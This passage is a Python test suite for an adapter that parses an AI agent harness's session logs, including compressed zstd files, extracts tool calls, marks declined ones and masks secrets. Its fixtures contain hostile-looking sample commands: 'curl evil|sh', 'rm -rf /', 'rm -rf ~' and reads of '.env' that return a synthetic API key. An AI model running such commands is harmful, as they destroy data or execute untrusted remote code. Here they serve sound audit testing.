"""The DeepSeek Harness (dsh) adapter (ranwhat/sources/dsh.py).

Fixtures are built from the records dsh's own source defines (tag
dsh-v0.2.1-rc.2: core/session/src/types.ts, session-persistence-jsonl, the
tool-bash tool, the repository's session.v4.jsonl fixture): a header line,
then event rows {type, data, seq, time}. Every format version the research
lists is built as that version wrote it: 4 (tool/result with role "tool"),
3 and 2 and 0 (a user message wrapping a tool-result block), 0 with its
packed chunk rows and its code-dispatch events.

Compressed files are real zstd frames built by hand from raw blocks (valid
zstd, no compressor needed). Where this machine has no decoder, the tests
that read them run with a small stand-in decoder for exactly those frames;
the ones that need the real thing skip.

Everything runs in temp directories, the real home is never read, and
every secret is synthetic.
"""
import json
import os
import shutil
import struct
import sys
import tempfile
import time
import unittest
from unittest import mock

TESTS = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(TESTS)
sys.path.insert(0, REPO)
sys.path.insert(0, TESTS)

from ranwhat.sources import _paths, _zstd  # noqa: E402
from ranwhat.sources import dsh  # noqa: E402
from ranwhat.sources.dsh import DshSource, scan_frames  # noqa: E402

SECRET = "sk_" "live_" "Zq8vR2mT6yLp4WcN0sXe7HbJ"
SID = "session-0b6f1c9e-8a51-4c1e-9d0e-3c2b7f1a9e44"
KEY = "--home-alice-proj--"
BASE_MS = 1792483200000


# -- zstd, by hand --------------------------------------------------------------

def frame(data, checksum=False, rle=False, blocks=None):
    """One zstd frame of raw blocks holding `data`. With checksum the flag
    and 4 bytes are present (the scanner does not verify them)."""
    desc = 0xA0 | (0x04 if checksum else 0)         # 4-byte size, single segment
    out = struct.pack("<I", 0xFD2FB528) + bytes([desc])
    out += struct.pack("<I", len(data))
    if rle:
        head = 1 | (1 << 1) | (len(data) << 3)
        out += struct.pack("<I", head)[:3] + data[:1]
    else:
        pieces = blocks or [data]
        for i, piece in enumerate(pieces):
            head = (1 if i == len(pieces) - 1 else 0) | (len(piece) << 3)
            out += struct.pack("<I", head)[:3] + piece
    if checksum:
        out += b"\0\0\0\0"
    return out


def fake_decompress(data, limit=_zstd.MAX_OUTPUT):
    """A decoder for the frames frame() builds (raw and RLE blocks, no
    checksum check), standing in when the machine has none."""
    frames, torn, error = scan_frames(bytes(data))
    if torn is not None or error or not frames:
        return None
    out, pos = [], 0
    for start, end in frames:
        pos = start + 4
        desc = data[pos]
        pos += 1 + (0 if desc & 0x20 else 1) + (0, 1, 2, 4)[desc & 3]
        size = (0, 2, 4, 8)[desc >> 6] or (1 if desc & 0x20 else 0)
        pos += size
        while True:
            head = data[pos] | data[pos + 1] << 8 | data[pos + 2] << 16
            pos += 3
            kind, n = (head >> 1) & 3, head >> 3
            if kind == 0:
                out.append(bytes(data[pos:pos + n]))
                pos += n
            elif kind == 1:
                out.append(bytes(data[pos:pos + 1]) * n)
                pos += 1
            else:
                return None
            if head & 1:
                break
    result = b"".join(out)
    return None if len(result) > limit else result


def real_decoder():
    return _zstd.available()


# -- records ---------------------------------------------------------------------

def dump(obj):
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False)


def header(version=4, sid=SID, cwd="/home/alice/proj", **extra):
    h = {"type": "session", "version": version, "id": sid,
         "createdAt": BASE_MS}
    if cwd is not None:
        h["cwd"] = cwd
    if version >= 2:
        h["isSeeded"] = False
    else:
        h["seedLength"] = 0
    h["delegationDepth"] = 0
    h.update(extra)
    return h


def event(seq, kind, data, **extra):
    row = {"type": kind, "data": data, "seq": seq,
           "time": BASE_MS + seq * 1000}
    row.update(extra)
    return row


def call(seq, cid, name, arguments, turn=1):
    if not isinstance(arguments, str):
        arguments = dump(arguments)
    return event(seq, "tool/call", {"turn": turn, "step": 1, "callId": cid,
                                    "name": name, "arguments": arguments})


def result(seq, cid, text, version=4, call_seq=None, is_error=False, **data):
    content = [{"type": "text", "text": text}]
    if version >= 4:
        message = {"id": "msg-1", "role": "tool", "toolCallId": cid,
                   "source": {"kind": "tool", "callId": cid},
                   "content": content, "isError": is_error}
    else:
        message = {"id": "msg-1", "role": "user",
                   "source": {"kind": "tool", "callId": cid},
                   "content": [{"type": "tool-result", "toolCallId": cid,
                                "content": content, "isError": is_error}]}
    body = {"turn": 1, "step": 1, "message": message}
    body.update(data)
    extra = {"sourceEventSeqs": [call_seq]} if call_seq is not None else {}
    return event(seq, "tool/result", body, surfaceOp="append", **extra)


def body(lines):
    return "".join(dump(l) + "\n" for l in lines).encode("utf-8")


def compress(lines):
    """A zstd file: the header alone in frame 1, then one frame per row."""
    return b"".join(frame(body([l])) for l in lines)


def real_compress(data):
    if _zstd._stdlib is not None:
        return _zstd._stdlib.compress(data)
    return None


class _Case(unittest.TestCase):
    def setUp(self):
        self.home = tempfile.mkdtemp(prefix="dsh-home-")
        self.addCleanup(shutil.rmtree, self.home, True)
        self.dsh_home = os.path.join(self.home, ".dsh")
        self.root = os.path.join(self.dsh_home, "sessions")
        patches = [mock.patch.dict(os.environ, {
            "HOME": self.home, "USERPROFILE": self.home,
            "DSH_HOME": self.dsh_home}),
            mock.patch.object(_paths, "home", return_value=self.home)]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        self.src = DshSource()

    def decoder(self):
        """Use the stand-in decoder for hand-built frames."""
        for p in (mock.patch.object(_zstd, "decompress", fake_decompress),
                  mock.patch.object(_zstd, "available", lambda: True)):
            p.start()
            self.addCleanup(p.stop)

    def write(self, name, data, project=KEY, session=SID, age=3600):
        folder = os.path.join(self.root, project, session)
        os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, name)
        with open(path, "wb") as fh:
            fh.write(data)
        when = time.time() - age
        os.utime(path, (when, when))
        return path

    def stores(self):
        self.src.reset()
        return self.src.stores(self.src.locations())

    def calls(self, store=None):
        self.src.reset()
        if store is None:
            found = self.src.stores(self.src.locations())
            self.assertEqual(len(found), 1)
            store = found[0]
        return list(self.src.tool_calls(store))


V4 = [header(4),
      call(1, "call_1", "bash", {"description": "Run the tests",
                                 "command": "npm test",
                                 "workdir": "packages/api"}),
      result(2, "call_1", "FAIL src/a.test.ts\n[stderr]\nboom\n[exit code: 1]",
             call_seq=1, meta={"cwd": "/home/alice/proj/packages/api"}),
      call(3, "call_2", "write", {"file_path": "src/new.ts",
                                  "content": "export {}"}),
      result(4, "call_2", "ok", call_seq=3),
      call(5, "call_3", "edit", {"file_path": "src/a.ts", "old_string": "a",
                                 "new_string": "b"}),
      result(6, "call_3", "ok", call_seq=5),
      call(7, "call_4", "read", {"file_path": ".env"}),
      result(8, "call_4", "KEY=" + SECRET, call_seq=7)]


class Locations(_Case):
    def paths(self, env, home, platform):
        return DshSource().default_paths(env, home, platform)

    def test_linux(self):
        self.assertEqual(self.paths({}, "/home/a", "linux"),
                         [("/home/a/.dsh/sessions", "default")])

    def test_macos(self):
        self.assertEqual(self.paths({}, "/Users/a", "darwin"),
                         [("/Users/a/.dsh/sessions", "default")])

    def test_windows(self):
        self.assertEqual(self.paths({}, "C:\\Users\\a", "win32"),
                         [("C:\\Users\\a\\.dsh\\sessions", "default")])

    def test_dsh_home_wins_on_every_system(self):
        self.assertEqual(self.paths({"DSH_HOME": "/data/dsh"}, "/home/a",
                                    "linux"),
                         [("/data/dsh/sessions", "env DSH_HOME")])
        self.assertEqual(self.paths({"DSH_HOME": "D:\\dsh"}, "C:\\Users\\a",
                                    "win32"),
                         [("D:\\dsh\\sessions", "env DSH_HOME")])

    def test_a_tilde_is_the_home_directory(self):
        self.assertEqual(self.paths({"DSH_HOME": "~/agents"}, "/home/a",
                                    "linux")[0][0],
                         "/home/a/agents/sessions")
        self.assertEqual(self.paths({"DSH_HOME": "~\\agents"}, "C:\\u",
                                    "win32")[0][0],
                         "C:\\u\\agents\\sessions")

    def test_a_blank_variable_is_not_set(self):
        for blank in ("", "   ", "\t"):
            self.assertEqual(self.paths({"DSH_HOME": blank}, "/home/a",
                                        "linux")[0][1], "default")

    def test_missing_variable_and_missing_folder(self):
        with mock.patch.dict(os.environ):
            del os.environ["DSH_HOME"]
            self.src.reset()
            locs = self.src.locations()
        self.assertEqual(len(locs), 1)
        self.assertEqual(locs[0].path,
                         os.path.join(self.home, ".dsh", "sessions"))
        self.assertFalse(locs[0].exists)
        self.assertEqual(self.stores(), [])

    def test_the_env_location_reports_its_stores(self):
        self.write("session.v4.jsonl", body(V4))
        locs = self.src.locations()
        self.assertEqual((locs[0].how, locs[0].exists, locs[0].found),
                         ("env DSH_HOME", True, 1))

    def test_path_may_be_the_dsh_home_itself(self):
        self.write("session.v4.jsonl", body(V4))
        self.src.reset()
        found = self.src.stores(self.src.locations(self.dsh_home))
        self.assertEqual(len(found), 1)

    def test_identity(self):
        self.assertEqual((self.src.id, self.src.env), ("dsh", ("DSH_HOME",)))


class Stores(_Case):
    def test_an_empty_store(self):
        os.makedirs(self.root)
        self.assertEqual(self.stores(), [])
        self.write("session.v4.jsonl", b"")
        found = self.stores()
        self.assertEqual(len(found), 1)
        self.assertEqual(self.calls(found[0]), [])
        self.assertEqual(self.src.counts["unparsed"], 0)

    def test_a_plain_store(self):
        self.write("session.v4.jsonl", body(V4))
        s, = self.stores()
        self.assertEqual((s.source, s.format, s.role, s.masking),
                         ("dsh", "jsonl", "transcript", "rewrite"))
        self.assertEqual((s.session, s.project), (SID, "/home/alice/proj"))

    def test_a_compressed_store_is_read_only(self):
        self.write("session.v4.jsonl.zstd", compress(V4))
        s, = self.stores()
        self.assertEqual((s.format, s.masking), ("jsonl.zst", "read-only"))
        self.assertEqual(s.session, SID if real_decoder() else SID)

    def test_the_highest_generation_is_the_transcript(self):
        self.write("session.jsonl", body([header(0)]))
        self.write("session.v3.jsonl.zstd", compress([header(3)]))
        self.write("session.v4.jsonl.zstd", compress(V4))
        found = self.stores()
        roles = {os.path.basename(s.path): s.role for s in found}
        self.assertEqual(roles, {"session.v4.jsonl.zstd": "transcript",
                                 "session.v3.jsonl.zstd": "side",
                                 "session.jsonl": "side"})

    def test_only_canonical_names_are_stores(self):
        for name in ("session.lock", "session.v4.jsonl.abc123.tmp",
                     "session.migration.xyz.jsonl.zstd.tmp", "session.v0.jsonl",
                     "session.v04.jsonl", "session.v4.jsonl.gz", "x.jsonl"):
            self.write(name, b"x")
        self.write("session.v4.jsonl", body(V4))
        self.assertEqual([os.path.basename(s.path) for s in self.stores()],
                         ["session.v4.jsonl"])

    def test_a_flat_file_in_a_project_folder_is_not_read(self):
        os.makedirs(os.path.join(self.root, KEY))
        with open(os.path.join(self.root, KEY, "session.jsonl"), "wb") as fh:
            fh.write(body(V4))
        self.assertEqual(self.stores(), [])

    def test_no_cwd_sessions_and_many_projects(self):
        self.write("session.v4.jsonl", body([header(cwd=None)]),
                   project="_no-cwd")
        self.write("session.v4.jsonl", body(V4), project=KEY,
                   session="session-b")
        found = self.stores()
        self.assertEqual(len(found), 2)
        self.assertEqual(sorted(s.project or "" for s in found),
                         ["", "/home/alice/proj"])

    def test_the_session_falls_back_to_its_folder(self):
        self.write("session.v4.jsonl", b"not json\n", session="session-x")
        s, = self.stores()
        self.assertEqual((s.session, s.project), ("session-x", None))

    def test_since_days_filters_by_mtime(self):
        self.write("session.v4.jsonl", body(V4), age=40 * 86400)
        self.src.reset()
        self.assertEqual(self.src.stores(self.src.locations(), 7), [])


class Calls(_Case):
    def test_a_shell_call_with_its_result(self):
        self.write("session.v4.jsonl", body(V4))
        c = self.calls()[0]
        self.assertEqual((c.tool_name, c.kind, c.known, c.command),
                         ("bash", "shell", True, "npm test"))
        self.assertEqual(c.tool_call_id, "call_1")
        self.assertEqual(c.workdir, "/home/alice/proj/packages/api")
        self.assertEqual(c.consumed, frozenset(["command"]))
        self.assertIn("[exit code: 1]", c.output)
        self.assertEqual(c.session, SID)
        self.assertEqual(c.project, "/home/alice/proj")
        self.assertEqual(c.timestamp, "2026-10-20T08:00:01Z")
        self.assertEqual(c.actor, "agent")
        self.assertIsNone(c.status)

    def test_write_edit_and_read(self):
        self.write("session.v4.jsonl", body(V4))
        got = {c.tool_call_id: c for c in self.calls()}
        w, e, r = got["call_2"], got["call_3"], got["call_4"]
        self.assertEqual((w.kind, w.paths), ("write", ("src/new.ts",)))
        self.assertEqual((e.kind, e.paths), ("write", ("src/a.ts",)))
        self.assertEqual((r.kind, r.paths, r.consumed),
                         ("read", (".env",), frozenset(["file_path"])))
        self.assertEqual(r.output, "KEY=" + SECRET)

    def test_a_relative_workdir_without_a_result_meta(self):
        rows = [header(), call(1, "c", "bash", {"command": "ls",
                                                "workdir": "sub"}),
                result(2, "c", "x", call_seq=1)]
        self.write("session.v4.jsonl", body(rows))
        self.assertEqual(self.calls()[0].workdir, "/home/alice/proj/sub")

    def test_a_windows_cwd_and_pwsh(self):
        rows = [header(cwd="C:\\Users\\me\\proj"),
                call(1, "c", "pwsh", {"command": "dir", "workdir": "src"}),
                result(2, "c", "x")]
        self.write("session.v4.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.kind, c.command, c.workdir),
                         ("shell", "dir", "C:\\Users\\me\\proj\\src"))

    def test_working_directory_change_moves_the_project(self):
        rows = [header(), event(1, "working-directory/change",
                                {"cwd": "/srv/other"}),
                call(2, "c", "bash", {"command": "ls"})]
        self.write("session.v4.jsonl", body(rows))
        self.assertEqual(self.calls()[0].project, "/srv/other")

    def test_an_unknown_tool_is_other(self):
        rows = [header(), call(1, "c", "run_code", {"code": "x"}),
                result(2, "c", "x")]
        self.write("session.v4.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.kind, c.known), ("other", False))

    def test_a_call_with_no_result_is_still_a_call(self):
        rows = [header(), call(1, "c", "bash", {"command": "sleep 99"})]
        self.write("session.v4.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.command, c.output), ("sleep 99", None))

    def test_arguments_that_are_not_json(self):
        rows = [header(), call(1, "c", "bash", "{not json")]
        self.write("session.v4.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual(c.tool_input, {"_raw": "{not json"})
        self.assertIsNone(c.command)

    def test_a_repeated_call_id_counts_once(self):
        rows = [header(), call(1, "c", "bash", {"command": "ls"}),
                call(2, "c", "bash", {"command": "ls"}),
                result(3, "c", "a"), result(4, "c", "b")]
        self.write("session.v4.jsonl", body(rows))
        self.assertEqual(len(self.calls()), 1)

    def test_a_rejected_approval_is_declined(self):
        rows = [header(), call(1, "c1", "bash", {"command": "rm -rf x"}),
                event(2, "approval/asked", {"id": "ap1", "toolName": "bash",
                                            "callId": "c1"}),
                event(3, "approval/decided", {"id": "ap1",
                                              "outcome": "rejected"}),
                result(4, "c1", "rejected by user", is_error=True),
                call(5, "c2", "bash", {"command": "ls"}),
                event(6, "approval/asked", {"id": "ap2", "toolName": "bash",
                                            "callId": "c2"}),
                event(7, "approval/decided", {"id": "ap2",
                                              "outcome": "allowed-once"}),
                result(8, "c2", "ok"),
                call(9, "c3", "bash", {"command": "x"}),
                event(10, "approval/asked", {"id": "ap3", "toolName": "bash",
                                             "callId": "c3"}),
                event(11, "approval/decided", {"id": "ap3",
                                               "outcome": "cancelled"})]
        self.write("session.v4.jsonl", body(rows))
        got = {c.tool_call_id: c.status for c in self.calls()}
        self.assertEqual(got, {"c1": "declined", "c2": None,
                               "c3": "declined"})

    def test_calls_that_never_ran_are_declined(self):
        rows = [header()]
        codes = ["ABORTED_BEFORE_DISPATCH", "TOOL_NOT_STARTED", "UNKNOWN_TOOL",
                 "TOOL_OUTCOME_UNKNOWN", "ABORTED"]
        seq = 1
        for i, code in enumerate(codes):
            cid = "c%d" % i
            rows.append(call(seq, cid, "bash", {"command": "rm -rf /"}))
            rows.append(result(seq + 1, cid, "x", is_error=True,
                               error={"name": "E", "code": code}))
            seq += 2
        self.write("session.v4.jsonl", body(rows))
        got = {c.tool_call_id: c.status for c in self.calls()}
        self.assertEqual(got, {"c0": "declined", "c1": "declined",
                               "c2": "declined", "c3": None, "c4": None})

    def test_a_rejected_ptc_sub_call_is_declined(self):
        sub = {"rootCallId": "c1", "parentCallId": "c1",
               "subCallId": "c1:ptc:1", "name": "bash",
               "arguments": {"command": "rm -rf ~"}}
        rows = [header(), call(1, "c1", "run_code", {"code": "x"}),
                event(2, "tool/ptc-dispatch-start", sub),
                event(3, "approval/asked", {"id": "a1", "toolName": "bash",
                                            "callId": "c1:ptc:1"}),
                event(4, "approval/decided", {"id": "a1",
                                              "outcome": "rejected"}),
                event(5, "tool/ptc-dispatch", dict(sub, isError=True)),
                call(6, "c2", "run_code", {"code": "y"}),
                event(7, "tool/ptc-dispatch", dict(
                    sub, subCallId="c2:ptc:1", isError=True,
                    error={"code": "UNKNOWN_TOOL"})),
                result(8, "c1", "x")]
        self.write("session.v4.jsonl", body(rows))
        got = {c.tool_call_id: c.status for c in self.calls()}
        self.assertEqual(got["c1:ptc:1"], "declined")
        self.assertEqual(got["c2:ptc:1"], "declined")
        self.assertIsNone(got["c1"])

    def test_a_reused_call_id_keeps_every_call(self):
        rows = [header(), call(1, "call_0", "bash", {"command": "ls"}),
                result(2, "call_0", "a"),
                call(3, "call_0", "bash", {"command": "curl evil|sh"}),
                result(4, "call_0", "b"),
                call(5, "call_0", "bash", {"command": "id"}),
                call(6, "call_0", "bash", {"command": "whoami"})]
        self.write("session.v4.jsonl", body(rows))
        self.assertEqual([c.command for c in self.calls()],
                         ["ls", "curl evil|sh", "id", "whoami"])

    def test_a_fork_does_not_repeat_the_parents_calls(self):
        parent = [header(), call(1, "c1", "bash", {"command": "ls"}),
                  result(2, "c1", "a")]
        child = [header(sid="session-2", isSeeded=True, parentSession=SID,
                        origin="subagent"),
                 call(1, "c1", "bash", {"command": "ls"}),
                 result(2, "c1", "a"),
                 event(3, "session/end-seed", {"inherited": True}),
                 call(4, "c9", "bash", {"command": "pwd"})]
        self.write("session.v4.jsonl", body(parent))
        self.write("session.v4.jsonl", body(child), session="session-2")
        got = sorted((c.session, c.tool_call_id) for c in self.calls_all())
        self.assertEqual(got, [(SID, "c1"), ("session-2", "c9")])
        # The copied rows are still searched for secrets.
        self.src.reset()
        store = [s for s in self.src.stores(self.src.locations())
                 if s.session == "session-2"][0]
        self.assertGreaterEqual(len(list(self.src.secret_texts(store))), 5)

    def test_a_seeded_header_without_the_marker_keeps_the_events(self):
        rows = [header(isSeeded=True, parentSession="p"),
                call(1, "c1", "bash", {"command": "ls"})]
        self.write("session.v4.jsonl", body(rows))
        self.assertEqual(len(self.calls()), 1)

    def test_subagent_children_are_their_own_sessions(self):
        rows = [header(sid="session-child", origin="subagent",
                       parentSession=SID),
                call(1, "k", "bash", {"command": "ls"})]
        self.write("session.v4.jsonl", body(rows), session="session-child")
        self.write("session.v4.jsonl", body(V4))
        sessions = sorted(c.session for c in self.calls_all())
        self.assertIn("session-child", sessions)

    def calls_all(self):
        self.src.reset()
        out = []
        for s in self.src.stores(self.src.locations()):
            out.extend(self.src.tool_calls(s))
        return out


class Versions(_Case):
    def test_v3_wraps_the_result_in_a_user_message(self):
        rows = [header(3), call(1, "c", "bash", {"command": "ls"}),
                result(2, "c", "a\nb", version=3, call_seq=1)]
        self.write("session.v3.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.command, c.output), ("ls", "a\nb"))

    def test_v2_is_the_v3_wrapper(self):
        rows = [header(2), call(1, "c", "write", {"file_path": "a.txt"}),
                result(2, "c", "ok", version=2)]
        self.write("session.v2.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.kind, c.paths, c.output),
                         ("write", ("a.txt",), "ok"))

    def test_v0_has_packed_chunk_rows_without_a_seq(self):
        rows = [header(0),
                {"type": "text-chunks", "seq0": 1, "time0": BASE_MS,
                 "data": {"turn": 1, "step": 1, "index": 0, "dt": [1, 2],
                          "text": ["he", "llo"]}},
                call(2, "c", "bash", {"command": "ls"}),
                {"type": "tool-call-chunks", "seq0": 3, "time0": BASE_MS,
                 "data": {"turn": 1, "step": 1, "index": 0, "dt": [1]}},
                result(4, "c", "ok", version=0, call_seq=2)]
        self.write("session.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.command, c.output), ("ls", "ok"))

    def test_v0_result_paired_by_source_seq_when_the_id_is_missing(self):
        wrapped = result(3, "c", "ok", version=0, call_seq=2)
        del wrapped["data"]["message"]["content"][0]["toolCallId"]
        rows = [header(0), call(2, "c", "bash", {"command": "ls"}), wrapped]
        self.write("session.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual(c.command, "ls")

    def test_ptc_dispatch_v3_and_v4(self):
        start = {"rootCallId": "r", "parentCallId": "r", "subCallId": "r:ptc:1",
                 "name": "bash", "arguments": {"command": "cat .env"}}
        done = dict(start, isError=False,
                    content=[{"type": "text", "text": "X=1"}])
        rows = [header(), call(1, "r", "run_code", {"code": "..."}),
                event(2, "tool/ptc-dispatch-start", start),
                event(3, "tool/ptc-dispatch", done),
                event(4, "tool/ptc-dispatch-start",
                      dict(start, subCallId="r:ptc:2", arguments={
                          "file_path": "a.py"}, name="read")),
                result(5, "r", "ok")]
        self.write("session.v4.jsonl", body(rows))
        got = {c.tool_call_id: c for c in self.calls()}
        self.assertEqual(set(got), {"r", "r:ptc:1", "r:ptc:2"})
        self.assertEqual((got["r:ptc:1"].command, got["r:ptc:1"].output),
                         ("cat .env", "X=1"))
        self.assertEqual(got["r:ptc:2"].kind, "read")

    def test_ptc_dispatch_before_v3_is_named_code_dispatch(self):
        data = {"rootCallId": "r", "parentCallId": "r", "subCallId": "r:ptc:1",
                "name": "bash", "arguments": {"command": "ls"}}
        rows = [header(2), event(1, "tool/code-dispatch-start", data),
                event(2, "tool/code-dispatch", dict(data, isError=False,
                                                    content="done"))]
        self.write("session.v2.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual((c.command, c.output), ("ls", "done"))

    def test_unknown_event_types_and_versions_are_counted_not_fatal(self):
        rows = [header(9), event(1, "plugin:thing", {"x": 1}),
                call(2, "c", "bash", {"command": "ls"}), [1, 2], "str"]
        self.write("session.v4.jsonl", body(rows))
        c, = self.calls()
        self.assertEqual(c.command, "ls")
        self.assertEqual(self.src.counts["unknown"], 3)


class Damaged(_Case):
    def test_a_malformed_line_is_counted_and_skipped(self):
        data = (body(V4[:3]) + b"{this is not json}\n" + body(V4[3:5]))
        self.write("session.v4.jsonl", data)
        self.assertEqual(len(self.calls()), 2)
        self.assertEqual(self.src.counts["unparsed"], 1)

    def test_a_truncated_last_line_is_a_record_still_being_written(self):
        data = body(V4[:3]) + dump(V4[3])[:30].encode()
        self.write("session.v4.jsonl", data)
        self.assertEqual(len(self.calls()), 1)
        self.assertEqual(self.src.counts["unparsed"], 0)

    def test_not_json_at_all_is_unreadable(self):
        self.write("session.v4.jsonl", b"hello\nworld\n")
        self.assertEqual(self.calls(), [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)

    def test_non_utf8_bytes_do_not_stop_the_read(self):
        rows = [header(), call(1, "c", "bash", {"command": "echo X"}),
                result(2, "c", "A")]
        data = body(rows).replace(b'"A"', b'"\xff\xfe bad"')
        self.write("session.v4.jsonl", data)
        c, = self.calls()
        self.assertEqual(c.command, "echo X")
        self.assertIn("bad", c.output)

    def test_a_byte_order_mark_and_crlf(self):
        data = b"\xef\xbb\xbf" + body(V4[:3]).replace(b"\n", b"\r\n")
        self.write("session.v4.jsonl", data)
        c, = self.calls()
        self.assertEqual(c.command, "npm test")

    def test_an_oversized_line_is_skipped_and_counted(self):
        big = dump(call(5, "big", "bash", {"command": "x" * 2000}))
        self.write("session.v4.jsonl", body(V4[:3]) + big.encode() + b"\n"
                   + body(V4[3:5]))
        with mock.patch.object(dsh, "MAX_LINE", 1000):
            got = [c.tool_call_id for c in self.calls()]
        self.assertEqual(got, ["call_1", "call_2"])
        self.assertEqual(self.src.counts["unparsed"], 1)

    def test_a_deeply_nested_line_is_skipped(self):
        deep = ("[" * 100000 + "]" * 100000).encode()
        self.write("session.v4.jsonl", body(V4[:3]) + deep + b"\n")
        self.assertEqual(len(self.calls()), 1)

    def test_a_directory_named_like_a_log_is_not_a_store(self):
        folder = os.path.join(self.root, KEY, SID)
        os.makedirs(os.path.join(folder, "session.v4.jsonl"))
        self.assertEqual(self.stores(), [])

    def test_a_vanished_file_is_unreadable_not_a_crash(self):
        path = self.write("session.v4.jsonl", body(V4))
        s, = self.stores()
        os.unlink(path)
        self.assertEqual(list(self.src.tool_calls(s)), [])
        self.assertEqual(self.src.counts["unreadable_stores"], 1)


class Frames(unittest.TestCase):
    def test_scan_finds_frames_with_every_block_kind(self):
        a = frame(b"hello\n")
        b = frame(b"x" * 300, checksum=True, rle=True)
        c = frame(b"abcdef", blocks=[b"abc", b"def"])
        skip = struct.pack("<II", 0x184D2A50, 3) + b"abc"
        data = a + b + skip + c
        frames, torn, error = scan_frames(data)
        self.assertEqual((torn, error), (None, None))
        self.assertEqual(frames, [(0, len(a)), (len(a), len(a) + len(b)),
                                  (len(a) + len(b),
                                   len(a) + len(b) + len(skip)),
                                  (len(a) + len(b) + len(skip), len(data))])

    def test_every_cut_of_a_frame_is_torn_not_an_error(self):
        a = frame(b"hello\n", checksum=True)
        b = frame(b"world\n", checksum=True)
        for cut in range(1, len(b)):
            frames, torn, error = scan_frames(a + b[:cut])
            self.assertEqual((frames, torn, error),
                             ([(0, len(a))], len(a), None), cut)

    def test_not_zstd(self):
        self.assertEqual(scan_frames(b"")[0], [])
        frames, torn, error = scan_frames(b"plain text, not zstd")
        self.assertEqual(frames, [])
        self.assertIsNotNone(error)
        good = frame(b"x\n")
        frames, torn, error = scan_frames(good + b"garbage!")
        self.assertEqual(frames, [(0, len(good))])
        self.assertIsNotNone(error)

    def test_reserved_block_type(self):
        bad = struct.pack("<I", 0xFD2FB528) + bytes([0xA0]) + b"\0\0\0\0" \
            + struct.pack("<I", 1 | (3 << 1))[:3]
        self.assertIsNotNone(scan_frames(bad)[2])

    def test_grouping(self):
        self.assertEqual(dsh._groups([(0, 10), (10, 20), (20, 100)], 50),
                         [(0, 20), (20, 100)])
        self.assertEqual(dsh._groups([], 50), [])


class Compressed(_Case):
    def test_a_compressed_session_reads_like_a_plain_one(self):
        self.decoder()
        self.write("session.v4.jsonl.zstd", compress(V4))
        calls = self.calls()
        self.assertEqual([c.tool_call_id for c in calls],
                         ["call_1", "call_2", "call_3", "call_4"])
        self.assertEqual(calls[0].project, "/home/alice/proj")

    def test_batches_of_rows_in_one_frame(self):
        self.decoder()
        data = frame(body(V4[:1])) + frame(body(V4[1:])) 
        self.write("session.v4.jsonl.zstd", data)
        self.assertEqual(len(self.calls()), 4)

    def test_a_torn_last_frame_is_left_out(self):
        self.decoder()
        data = compress(V4[:3]) + frame(body(V4[3:5]))[:-5]
        self.write("session.v4.jsonl.zstd", data)
        self.assertEqual(len(self.calls()), 1)
        self.assertEqual(self.src.counts["unreadable_stores"], 0)

    def test_a_line_may_span_frames(self):
        self.decoder()
        text = body(V4[:3])
        self.write("session.v4.jsonl.zstd",
                   frame(text[:100]) + frame(text[100:]))
        self.assertEqual(len(self.calls()), 1)

    def test_no_decoder_is_counted_unreadable_and_says_why(self):
        self.write("session.v4.jsonl.zstd", compress(V4))
        with mock.patch.object(_zstd, "available", lambda: False):
            self.assertEqual(self.calls(), [])
        self.assertEqual(self.src.unreadable,
                         {"compressed, " + _zstd.NEEDS: 1})
        self.assertEqual(self.src.counts["unreadable_stores"], 1)

    def test_not_zstd_data(self):
        self.decoder()
        self.write("session.v4.jsonl.zstd", b"just text\n")
        self.assertEqual(self.calls(), [])
        self.assertEqual(self.src.unreadable, {dsh.NOT_ZSTD: 1})

    def test_a_corrupt_frame_costs_that_frame_only(self):
        self.decoder()
        good, bad = frame(body(V4[:3])), frame(body(V4[3:5]))
        bad = bad[:8] + bytes([0xFF]) + bad[9:]     # wrong content: still scans
        real = fake_decompress

        def picky(data, limit=_zstd.MAX_OUTPUT):
            return None if bad in bytes(data) else real(data, limit)
        with mock.patch.object(_zstd, "decompress", picky):
            self.write("session.v4.jsonl.zstd", good + bad)
            self.assertEqual(len(self.calls()), 1)
        self.assertEqual(self.src.counts["unparsed"], 1)

    def test_too_much_after_decompression(self):
        self.decoder()
        self.write("session.v4.jsonl.zstd", compress(V4))
        with mock.patch.object(dsh, "MAX_PLAIN", 50):
            self.assertEqual(self.calls(), [])
        self.assertGreater(self.src.counts["unparsed"], 0)

    def test_a_file_too_big_to_load(self):
        self.decoder()
        self.write("session.v4.jsonl.zstd", compress(V4))
        with mock.patch.object(dsh, "MAX_COMPRESSED", 10):
            self.assertEqual(self.calls(), [])
        self.assertEqual(self.src.unreadable, {dsh.TOO_BIG: 1})

    def test_a_compressed_store_is_never_rewritten(self):
        self.write("session.v4.jsonl.zstd", compress(V4))
        s, = self.stores()
        with open(s.path, "rb") as fh:
            before = fh.read()
        result = self.src.mask(s, [SECRET])
        self.assertEqual((result.changed, result.skipped),
                         (False, "read-only"))
        with open(s.path, "rb") as fh:
            self.assertEqual(fh.read(), before)

    @unittest.skipUnless(real_decoder(), "no zstd decoder here")
    def test_with_the_real_decoder(self):
        self.write("session.v4.jsonl.zstd", compress(V4))
        self.assertEqual(len(self.calls()), 4)

    @unittest.skipUnless(_zstd._stdlib is not None, "needs Python 3.14")
    def test_a_real_compressor_s_frames_are_scanned_and_read(self):
        data = b"".join(real_compress(body([l])) for l in V4)
        frames, torn, error = scan_frames(data)
        self.assertEqual((len(frames), torn, error), (len(V4), None, None))
        self.write("session.v4.jsonl.zstd", data)
        self.assertEqual(len(self.calls()), 4)
        self.write("session.v4.jsonl.zstd", data + real_compress(
            body([result(9, "x", "y")]))[:-3])
        self.assertEqual(len(self.calls()), 4)


class Secrets(_Case):
    def test_secret_texts_cover_every_row_and_tie_results_to_calls(self):
        self.write("session.v4.jsonl", body(V4) + b"not json " + SECRET.encode()
                   + b"\n")
        s, = self.stores()
